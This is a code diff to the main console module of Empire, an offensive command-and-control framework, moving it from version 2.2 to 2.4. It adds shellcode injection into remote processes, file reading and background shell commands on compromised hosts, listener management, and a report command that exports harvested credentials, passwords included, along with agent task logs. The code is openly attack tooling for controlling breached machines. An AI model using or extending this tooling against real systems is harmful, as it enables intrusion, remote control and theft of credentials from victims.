@@ -9,7 +9,7 @@ menu loops.
 """
 
 # make version for Empire
-VERSION = "2.2"
+VERSION = "2.4"
 
 from pydispatch import dispatcher
 
@@ -22,7 +22,10 @@ import time
 import fnmatch
 import shlex
 import marshal
+import pkgutil
+import importlib
 import base64
+import threading
 
 # Empire imports
 import helpers
@@ -32,6 +35,7 @@ import listeners
 import modules
 import stagers
 import credentials
+import plugins
 from zlib_wrapper import compress
 from zlib_wrapper import decompress
 
@@ -70,10 +74,15 @@ class MainMenu(cmd.Cmd):
         # globalOptions[optionName] = (value, required, description)
         self.globalOptions = {}
 
+        # currently active plugins:
+        # {'pluginName': classObject}
+        self.loadedPlugins = {}
+
         # empty database object
         self.conn = self.database_connect()
         time.sleep(1)
 
+        self.lock = threading.Lock()
         # pull out some common configuration information
         (self.isroot, self.installPath, self.ipWhiteList, self.ipBlackList, self.obfuscate, self.obfuscateCommand) = helpers.get_config('rootuser, install_path,ip_whitelist,ip_blacklist,obfuscate,obfuscate_command')
 
@@ -84,7 +93,7 @@ class MainMenu(cmd.Cmd):
 
         dispatcher.connect(self.handle_event, sender=dispatcher.Any)
 
-        # Main, Agents, or Listeners
+        # Main, Agents, or 
         self.menu_state = 'Main'
 
         # parse/handle any passed command line arguments
@@ -96,8 +105,8 @@ class MainMenu(cmd.Cmd):
         self.modules = modules.Modules(self, args=args)
         self.listeners = listeners.Listeners(self, args=args)
         self.resourceQueue = []
-	#A hashtable of autruns based on agent language
-	self.autoRuns = {}
+        #A hashtable of autruns based on agent language
+        self.autoRuns = {}
 
         self.handle_args()
 
@@ -105,6 +114,15 @@ class MainMenu(cmd.Cmd):
 
         # print the loading menu
         messages.loading()
+    
+    def get_db_connection(self):
+        """
+        Returns the 
+        """
+        self.lock.acquire()
+        self.conn.row_factory = None
+        self.lock.release()
+        return self.conn
 
 
     def check_root(self):
@@ -149,7 +167,9 @@ class MainMenu(cmd.Cmd):
             # if we're displaying listeners/stagers or generating a stager
             if self.args.listener:
                 if self.args.listener == 'list':
-                    messages.display_active_listeners(self.listeners.activeListeners)
+                    messages.display_listeners(self.listeners.activeListeners)
+                    messages.display_listeners(self.listeners.get_inactive_listeners(), "Inactive")
+
                 else:
                     activeListeners = self.listeners.activeListeners
                     targetListener = [l for l in activeListeners if self.args.listener in l[1]]
@@ -382,6 +402,51 @@ class MainMenu(cmd.Cmd):
     ###################################################
     # CMD methods
     ###################################################
+
+    def do_plugins(self, args):
+        "List all available and active plugins."
+        pluginPath = os.path.abspath("plugins")
+        print(helpers.color("[*] Searching for plugins at {}".format(pluginPath)))
+        # From walk_packages: "Note that this function must import all packages
+        # (not all modules!) on the given path, in order to access the __path__
+        # attribute to find submodules."
+        pluginNames = [name for _, name, _ in pkgutil.walk_packages([pluginPath])]
+        numFound = len(pluginNames)
+
+        # say how many we found, handling the 1 case
+        if numFound == 1:
+            print(helpers.color("[*] {} plugin found".format(numFound)))
+        else:
+            print(helpers.color("[*] {} plugins found".format(numFound)))
+
+        # if we found any, list them
+        if numFound > 0:
+            print("\tName\tActive")
+            print("\t----\t------")
+            activePlugins = self.loadedPlugins.keys()
+            for name in pluginNames:
+                active = ""
+                if name in activePlugins:
+                    active = "******"
+                print("\t" + name + "\t" + active)
+
+        print("")
+        print(helpers.color("[*] Use \"plugin <plugin name>\" to load a plugin."))
+
+    def do_plugin(self, pluginName):
+        "Load a plugin file to extend Empire."
+        pluginPath = os.path.abspath("plugins")
+        print(helpers.color("[*] Searching for plugins at {}".format(pluginPath)))
+        # From walk_packages: "Note that this function must import all packages
+        # (not all modules!) on the given path, in order to access the __path__
+        # attribute to find submodules."
+        pluginNames = [name for _, name, _ in pkgutil.walk_packages([pluginPath])]
+        if pluginName in pluginNames:
+            print(helpers.color("[*] Plugin {} found.".format(pluginName)))
+            # 'self' is the mainMenu object
+            plugins.load_plugin(self, pluginName)
+        else:
+            raise Exception("[!] Error: the plugin specified does not exist in {}.".format(pluginPath))
 
     def postcmd(self, stop, line):
 	if len(self.resourceQueue) > 0:
@@ -732,7 +797,8 @@ class MainMenu(cmd.Cmd):
 
 
         elif parts[0].lower() == 'listeners':
-            messages.display_active_listeners(self.listeners.activeListeners)
+            messages.display_listeners(self.listeners.activeListeners)
+            messages.display_listeners(self.listeners.get_inactive_listeners(), "Inactive")
 
 
     def do_interact(self, line):
@@ -787,7 +853,7 @@ class MainMenu(cmd.Cmd):
             if obfuscate_all:
                 files = [file for file in helpers.get_module_source_files()]
             else:
-                files = [self.installPath + 'data/module_source/' + module]
+                files = ['data/module_source/' + module]
             for file in files:
                 file = self.installPath + file
                 if reobfuscate or not helpers.is_obfuscated(file):
@@ -796,6 +862,77 @@ class MainMenu(cmd.Cmd):
                     print helpers.color("[*] " + os.path.basename(file) + " was already obfuscated. Not reobfuscating.")
                 helpers.obfuscate_module(file, self.obfuscateCommand, reobfuscate)
 
+    def do_report(self, line):
+        "Produce report CSV and log files: sessions.csv, credentials.csv, master.log"
+        conn = self.get_db_connection()
+        try:
+            self.lock.acquire()
+
+            # Agents CSV
+            cur = conn.cursor()
+            cur.execute('select session_id, hostname, username, checkin_time from agents')
+
+            rows = cur.fetchall()
+            print helpers.color("[*] Writing data/sessions.csv")
+            f = open('data/sessions.csv','w')
+            f.write("SessionID, Hostname, User Name, First Check-in\n")
+            for row in rows:
+                f.write(row[0]+ ','+ row[1]+ ','+ row[2]+ ','+ row[3]+'\n')
+            f.close()
+
+            # Credentials CSV
+            cur.execute("""
+            SELECT
+                domain
+                ,username
+                ,host
+                ,credtype
+                ,password
+            FROM
+                credentials
+            ORDER BY
+                domain
+                ,credtype
+                ,host
+            """)
+
+            rows = cur.fetchall()
+            print helpers.color("[*] Writing data/credentials.csv")
+            f = open('data/credentials.csv','w')
+            f.write('Domain, Username, Host, Cred Type, Password\n')
+            for row in rows:
+                f.write(row[0]+ ','+ row[1]+ ','+ row[2]+ ','+ row[3]+ ','+ row[4]+'\n')
+            f.close()
+
+            # Empire Log
+            cur.execute("""
+            SELECT
+                reporting.time_stamp
+                ,reporting.event_type
+                ,reporting.name as "AGENT_ID"
+                ,a.hostname
+                ,reporting.taskID
+                ,t.data AS "Task"
+                ,r.data AS "Results"
+            FROM
+                reporting
+                JOIN agents a on reporting.name = a.session_id
+                LEFT OUTER JOIN taskings t on (reporting.taskID = t.id) AND (reporting.name = t.agent)
+                LEFT OUTER JOIN results r on (reporting.taskID = r.id) AND (reporting.name = r.agent)
+            WHERE
+                reporting.event_type == 'task' OR reporting.event_type == 'checkin'
+            """)
+            rows = cur.fetchall()
+            print helpers.color("[*] Writing data/master.log")
+            f = open('data/master.log', 'w')
+            f.write('Empire Master Taskings & Results Log by timestamp\n')
+            f.write('='*50 + '\n\n')
+            for row in rows:
+                f.write('\n' + row[0] + ' - ' + row[3] + ' (' + row[2] + ')> ' + unicode(row[5]) + '\n' + unicode(row[6]) + '\n')
+            f.close()
+            cur.close()
+        finally:
+            self.lock.release()
 
     def complete_usemodule(self, text, line, begidx, endidx, language=None):
         "Tab-complete an Empire module path."
@@ -1647,7 +1784,7 @@ class PowerShellAgentMenu(SubMenu):
                 self.mainMenu.agents.add_agent_task_db(self.sessionID, 'TASK_EXIT')
                 # update the agent log
                 self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to exit")
-                return True
+                raise NavAgents
 
         except KeyboardInterrupt:
             print ""
@@ -1675,24 +1812,6 @@ class PowerShellAgentMenu(SubMenu):
             self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_STOPJOB", jobID)
             # update the agent log
             self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop job " + str(jobID))
-
-    def do_downloads(self, line):
-        "Return downloads or kill a download job"
-
-        parts = line.split(' ')
-
-        if len(parts) == 1:
-            if parts[0] == '':
-                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_GETDOWNLOADS")
-                #update the agent log
-                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get downloads")
-            else:
-                print helpers.color("[!] Please use for m 'downloads kill DOWNLOAD_ID'")
-        elif len(parts) == 2:
-            jobID = parts[1].strip()
-            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_STOPDOWNLOAD", jobID)
-            #update the agent log
-            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop download " + str(jobID))
 
     def do_sleep(self, line):
         "Task an agent to 'sleep interval [jitter]'"
@@ -2033,6 +2152,37 @@ class PowerShellAgentMenu(SubMenu):
             print helpers.color("[!] Injection requires you to specify listener")
 
 
+    def do_shinject(self, line):
+        "Inject non-meterpreter listener shellcode into a remote process. Ex. shinject <listener> <pid>"
+
+        if line:
+            if self.mainMenu.modules.modules['powershell/management/shinject']:
+                module = self.mainMenu.modules.modules['powershell/management/shinject']
+                listenerID = line.split(' ')[0].strip()
+                arch = line.split(' ')[-1]
+                module.options['Listener']['Value'] = listenerID
+                module.options['Arch']['Value'] = arch
+
+                if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):
+                    if len(line.split(' ')) == 3:
+                        target = line.split(' ')[1].strip()
+                        if target.isdigit():
+                            module.options['ProcId']['Value'] = target
+                        else:
+                            print helpers.color('[!] Please enter a valid process ID.')
+
+                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
+                    module_menu = ModuleMenu(self.mainMenu, 'powershell/management/shinject')
+                    module_menu.do_execute("")
+                else:
+                    print helpers.color('[!] Please select a valid listener')
+            
+            else:
+                print helpers.color("[!] powershell/management/psinject module not loaded")
+        
+        else:
+            print helpers.color("[!] Injection requires you to specify listener")
+
     def do_injectshellcode(self, line):
         "Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid>"
 
@@ -2257,6 +2407,11 @@ class PowerShellAgentMenu(SubMenu):
 
         return self.complete_psinject(text, line, begidx, endidx)
 
+    def complete_shinject(self, text, line, begidx, endidx):
+        "Tab-complete psinject option values."
+
+        return self.complete_psinject(text, line, begidx, endidx)
+
     def complete_psinject(self, text, line, begidx, endidx):
         "Tab-complete psinject option values."
 
@@ -2425,7 +2580,7 @@ class PythonAgentMenu(SubMenu):
                 self.mainMenu.agents.add_agent_task_db(self.sessionID, 'TASK_EXIT')
                 # update the agent log
                 self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to exit")
-                return True
+                raise NavAgents
 
         except KeyboardInterrupt as e:
             print ""
@@ -2618,10 +2773,10 @@ class PythonAgentMenu(SubMenu):
             open_file.close()
             script = script.replace('\r\n', '\n')
             script = script.replace('\r', '\n')
-
+            encScript = base64.b64encode(script)
             msg = "[*] Tasked agent to execute python script: "+filename
             print helpers.color(msg, color="green")
-            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", script)
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_COMMAND", encScript)
             #update the agent log
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
         else:
@@ -2721,7 +2876,7 @@ class PythonAgentMenu(SubMenu):
             self.mainMenu.modules.search_modules(searchTerm)
 
     def do_sc(self, line):
-        "Use pyobjc and Foundation libraries to take a screenshot, and save the image to the server"
+        "Use the python-mss module to take a screenshot, and save the image to the server. Not opsec safe"
 
         if self.mainMenu.modules.modules['python/collection/osx/native_screenshot']:
             module = self.mainMenu.modules.modules['python/collection/osx/native_screenshot']
@@ -2735,23 +2890,53 @@ class PythonAgentMenu(SubMenu):
         else:
             print helpers.color("[!] python/collection/osx/screenshot module not loaded")
 
-    def do_ls(self, line):
+    def do_ls_m(self, line):
         "List directory contents at the specified path"
         #http://stackoverflow.com/questions/17809386/how-to-convert-a-stat-output-to-a-unix-permissions-string
-        if self.mainMenu.modules.modules['python/management/osx/ls']:
-            module = self.mainMenu.modules.modules['python/management/osx/ls']
+        if self.mainMenu.modules.modules['python/management/osx/ls_m']:
+            module = self.mainMenu.modules.modules['python/management/osx/ls_m']
             if line.strip() != '':
                 module.options['Path']['Value'] = line.strip()
 
             module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
-            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls')
+            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls_m')
             msg = "[*] Tasked agent to list directory contents of: "+str(module.options['Path']['Value'])
             print helpers.color(msg,color="green")
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
             module_menu.do_execute("")
 
         else:
-            print helpers.color("[!] python/management/osx/ls module not loaded")
+            print helpers.color("[!] python/management/osx/ls_m module not loaded")
+
+    def do_cat(self, line):
+        "View the contents of a file"
+
+        if line != "":
+
+            cmd = """
+try:
+    output = ""
+    with open("%s","r") as f:
+        for line in f:
+            output += line
+    
+    print output
+except Exception as e:
+    print str(e)
+""" % (line)
+            # task the agent with this shell command
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", str(cmd))
+            # update the agent log
+            msg = "Tasked agent to cat file %s" % (line)
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+
+    def do_pwd(self, line):
+        "Print working directory"
+
+        command = "cwd = os.getcwd(); print cwd"
+        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", command)
+        msg = "Tasked agent to print current working directory"
+        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
 
     def do_whoami(self, line):
         "Print the currently logged in user"
@@ -2785,6 +2970,24 @@ class PythonAgentMenu(SubMenu):
         else:
             print helpers.color("[!] Please provide a valid zipfile path", color="red")
 
+    def do_shellb(self, line):
+        """Execute a shell command as a background job"""
+        cmd = line.strip()
+        if self.mainMenu.modules.modules['python/management/osx/shellb']:
+            module = self.mainMenu.modules.modules['python/management/osx/shellb']
+            if line.strip() != '':
+                module.options['Command']['Value'] = line.strip()
+
+            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
+            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/shellb')
+            msg = "[*] Tasked agent to execute %s in the background" % (str(module.options['Path']['Value']))
+            print helpers.color(msg,color="green")
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+            module_menu.do_execute("")
+
+        else:
+            print helpers.color("[!] python/management/osx/shellb module not loaded")
+            
     def do_viewrepo(self, line):
         "View the contents of a repo. if none is specified, all files will be returned"
         repoName = line.strip()
@@ -2840,7 +3043,8 @@ class ListenersMenu(SubMenu):
         self.prompt = '(Empire: ' + helpers.color('listeners', color='blue') + ') > '
 
         # display all active listeners on menu startup
-        messages.display_active_listeners(self.mainMenu.listeners.activeListeners)
+        messages.display_listeners(self.mainMenu.listeners.activeListeners)
+        messages.display_listeners(self.mainMenu.listeners.get_inactive_listeners(), "Inactive")
 
     def do_back(self, line):
         "Go back to the main menu."
@@ -2873,6 +3077,21 @@ class ListenersMenu(SubMenu):
         else:
             self.mainMenu.listeners.kill_listener(listenerID)
 
+    def do_delete(self, line):
+        "Delete listener(s) from the database"
+
+        listener_id = line.strip()
+
+        if listener_id.lower() == "all":
+            try:
+                choice = raw_input(helpers.color("[>] Delete all listeners? [y/N] ", "red"))
+                if choice.lower() != '' and choice.lower()[0] == 'y':
+                    self.mainMenu.listeners.delete_listener("all")
+            except KeyboardInterrupt:
+                print ''
+
+        else:
+            self.mainMenu.listeners.delete_listener(listener_id)
 
     def do_usestager(self, line):
         "Use an Empire stager."
@@ -2934,10 +3153,16 @@ class ListenersMenu(SubMenu):
         if listenerName:
             try:
                 # set the listener value for the launcher
+                listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]
                 stager = self.mainMenu.stagers.stagers['multi/launcher']
                 stager.options['Listener']['Value'] = listenerName
                 stager.options['Language']['Value'] = language
                 stager.options['Base64']['Value'] = "True"
+                try:
+                    stager.options['Proxy']['Value'] = listenerOptions['options']['Proxy']['Value']
+                    stager.options['ProxyCreds']['Value'] = listenerOptions['options']['ProxyCreds']['Value']
+                except:
+                    pass
                 if self.mainMenu.obfuscate:
                     stager.options['Obfuscate']['Value'] = "True"
                 else:
@@ -2949,6 +3174,52 @@ class ListenersMenu(SubMenu):
         else:
             print helpers.color("[!] Please enter a valid listenerName")
 
+    def do_enable(self, line):
+        "Enables and starts one or all listners."
+
+        listenerID = line.strip()
+
+        if listenerID == '':
+            print helpers.color("[!] Please provide a listener name")
+        elif listenerID.lower() == 'all':
+            try:
+                choice = raw_input(helpers.color('[>] Start all listeners? [y/N] ', 'red'))
+                if choice.lower() != '' and choice.lower()[0] == 'y':
+                    self.mainMenu.listeners.enable_listener('all')
+            except KeyboardInterrupt:
+                print ''
+
+        else:
+            self.mainMenu.listeners.enable_listener(listenerID)
+
+    def do_disable(self, line):
+        "Disables (stops) one or all listeners. The listener(s) will not start automatically with Empire"
+
+        listenerID = line.strip()
+
+        if listenerID.lower() == 'all':
+            try:
+                choice = raw_input(helpers.color('[>] Stop all listeners? [y/N] ', 'red'))
+                if choice.lower() != '' and choice.lower()[0] == 'y':
+                    self.mainMenu.listeners.shutdown_listener('all')
+            except KeyboardInterrupt:
+                print ''
+
+        else:
+            self.mainMenu.listeners.disable_listener(listenerID)
+
+    def do_edit(self,line):
+        "Change a listener option, will not take effect until the listener is restarted"
+
+        arguments = line.strip().split(" ")
+        if len(arguments) < 2:
+            print helpers.color("[!] edit <listener name> <option name> <option value> (leave value blank to unset)")
+            return
+        if len(arguments) == 2:
+            arguments.append("")
+        self.mainMenu.listeners.update_listener_options(arguments[0], arguments[1], arguments[2])
+        if arguments[0] in self.activeListeners.keys():
+            print helpers.color("[*] This change will not take effect until the listener is restarted")
 
     def complete_usestager(self, text, line, begidx, endidx):
         "Tab-complete an Empire stager module path."
@@ -2964,6 +3235,30 @@ class ListenersMenu(SubMenu):
         offs = len(mline) - len(text)
         return [s[offs:] for s in names if s.startswith(mline)]
 
+    def complete_enable(self, text, line, begidx, endidx):
+        # tab complete for inactive listener names
+
+        inactive = self.mainMenu.listeners.get_inactive_listeners()
+        names = inactive.keys()
+        mline = line.partition(' ')[2]
+        offs = len(mline) - len(text)
+        return [s[offs:] for s in names if s.startswith(mline)]
+
+    def complete_disable(self, text, line, begidx, endidx):
+        # tab complete for listener names
+        # get all the listener names
+        names = self.mainMenu.listeners.activeListeners.keys() + ["all"]
+        mline = line.partition(' ')[2]
+        offs = len(mline) - len(text)
+        return [s[offs:] for s in names if s.startswith(mline)]
+
+    def complete_delete(self, text, line, begidx, endidx):
+        # tab complete for listener names
+        # get all the listener names
+        names = self.mainMenu.listeners.activeListeners.keys() + ["all"]
+        mline = line.partition(' ')[2]
+        offs = len(mline) - len(text)
+        return [s[offs:] for s in names if s.startswith(mline)]
 
     def complete_launcher(self, text, line, begidx, endidx):
         "Tab-complete language types and listener names/IDs"
@@ -3044,10 +3339,16 @@ class ListenerMenu(SubMenu):
 
         try:
             # set the listener value for the launcher
+            listenerOptions = self.mainMenu.listeners.activeListeners[self.listenerName]
             stager = self.mainMenu.stagers.stagers['multi/launcher']
             stager.options['Listener']['Value'] = self.listenerName
             stager.options['Language']['Value'] = parts[0]
             stager.options['Base64']['Value'] = "True"
+            try:
+                stager.options['Proxy']['Value'] = listenerOptions['options']['Proxy']['Value']
+                stager.options['ProxyCreds']['Value'] = listenerOptions['options']['ProxyCreds']['Value']
+            except:
+                pass
             print stager.generate()
         except Exception as e:
             print helpers.color("[!] Error generating launcher: %s" % (e))
